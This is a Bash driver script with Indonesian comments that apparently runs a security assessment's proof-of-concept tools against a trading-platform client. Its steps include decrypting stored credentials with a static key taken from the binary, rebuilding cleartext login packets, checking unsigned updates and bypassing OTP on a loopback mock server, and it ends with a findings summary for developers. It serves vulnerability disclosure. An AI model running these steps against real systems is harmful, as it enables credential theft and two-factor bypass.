#!/usr/bin/env bash
# jalankan_semua.sh — menjalankan seluruh PoC OLT, menampilkan STATUS + BUKTI
# (evidence) dari output nyata agar developer langsung paham kerentanannya.
# Read-only / lab-only. PoC5 --local memakai server mock loopback SAJA (tidak
# menyentuh jaringan produksi). Jangan menargetkan server produksi.
set -u
cd "$(dirname "$0")"
LOG=/tmp/opencode/poc_evidence
mkdir -p "$LOG"

# check <id> <namalog> <cmd...> : jalankan, simpan log, cetak PASS/FAIL
check() {
  local id="$1"; shift
  local lf="$LOG/$1.log"; shift
  if "$@" >"$lf" 2>&1; then
    echo "[PASS] $id"
  else
    echo "[FAIL] $id"
    echo "       >> log: $(tail -2 "$lf" | tr '\n' ' ')"
  fi
}

# bukti <id> <pattern...> : cetak baris-baris kunci dari log sebagai bukti
bukti() {
  local id="$1"; shift
  local lf="$LOG/$id.log"
  echo "       └─ bukti:"
  grep -Ei "$1" "$lf" | sed 's/^/          /' | head -6
  echo
}

echo "==============================================================="
echo "  OLT Platform — verifikasi PoC (lab-only)"
echo "  Tiap langkah menampilkan [PASS/FAIL] + BARIS BUKTI dari output"
echo "==============================================================="
echo

# ---- PoC1 — kripto kredensial + kunci statis di binary ----
check "poc01 selftest " poc01_selftest  python3 poc01_decrypt_pisdw.py --self-test
bukti   poc01_selftest  "DES KAT|58b8303f|round-trip|identik"

check "poc01 extract  " poc01_extract   python3 poc01_decrypt_pisdw.py --extract ../OLTLauncher.exe
bukti   poc01_extract   "kunci literal|literal ditemukan|0x0072c876"

check "poc01 make   " poc01_make  python3 poc01_decrypt_pisdw.py --make TRADER9 "demoP@ss1!" /tmp/opencode/pisdw_demo
check "poc01 decrypt " poc01_dec   python3 poc01_decrypt_pisdw.py /tmp/opencode/pisdw_demo
bukti   poc01_dec      "file      :|plaintext|UserID|Password"

# ---- PoC2 — paket login cleartext ----
check "poc02 login packet" poc02_login   python3 poc02_login_packet_recon.py TRADER001 "P@ssw0rd123" II 1
bukti   poc02_login    "cleartext fields|UserID|Password|on the wire"

# ---- PoC3 — manifest tanpa hash + scan jalur update ----
check "poc03 patch manifest" poc03_manifest python3 poc03_patch_integrity.py ../patch.dat
bukti   poc03_manifest "HASH COLUMN|SIGNATURE COLUMN|NO crypto"

# ---- PoC4 — signature Authenticode ----
check "poc04 signatures " poc04_sig      python3 poc04_signature_status.py
bukti   poc04_sig      "digest now|digest in signer|VERDICT|UNSIGNED|signed artifact"

# ---- PoC5 — OTP bypass struktural + handshake emulator ----
check "poc05 structural " poc05_struct   python3 poc05_otp_bypass.py structural
bukti   poc05_struct   "conclusion|no OTP|packet layout"

echo
echo "--- poc05 handshake (emulator loopback :19001, max 12s) ---"
(timeout 12 python3 -u poc05_otp_bypass.py --otp-server --port 19001 >"$LOG/srv.log" 2>&1 &) ; sleep 1
if python3 poc05_otp_bypass.py --local --port 19001 >"$LOG/cli.log" 2>&1; then
  echo "[PASS] poc05 handshake (server mock TANPA challenge OTP)"
  echo "       └─ bukti:"
  grep -Ei "respons server|Log In Successfully|analisis|Kesimpulan" "$LOG/cli.log" | sed 's/^/          /' | head -6
else
  echo "[FAIL] poc05 handshake"
  tail -3 "$LOG/cli.log"
fi
sleep 1

echo
echo "==============================================================="
echo "  RINGKASAN — APA YANG DIBUKTIKAN (untuk dev)"
echo "  - PoC1 : kunci kredensial statis di binary (MD5 58b8303f...)  [HIGH]"
echo "           -> 'pisdw' praktis password ter-encode; siapa pun bisa baca"
echo "  - PoC2 : login ASCII cleartext di raw TCP :8801, tanpa TLS     [HIGH]"
echo "           -> UserID+Password terbaca di jaringan (tcpdump)"
echo "  - PoC3 : update tanpa hash/signature, jalur patch tanpa kripto [CRITICAL]"
echo "           -> MITM update = RCE, tanpa deteksi"
echo "  - PoC4 : Authenticode EV INVALID utk file; OLTPatcher unsigned [HIGH]"
echo "           -> file yg beredar bukan file yg ditandatangani"
echo "  - PoC5 : OTP hanya di HTTPS; jalur TCP :8801 tanpa field OTP    [HIGH]"
echo "           -> 2FA bisa dilewati via jalur legacy"
echo "==============================================================="
echo "- Detail cara baca tiap bukti:  PENJELASAN_UNTUK_DEV.md"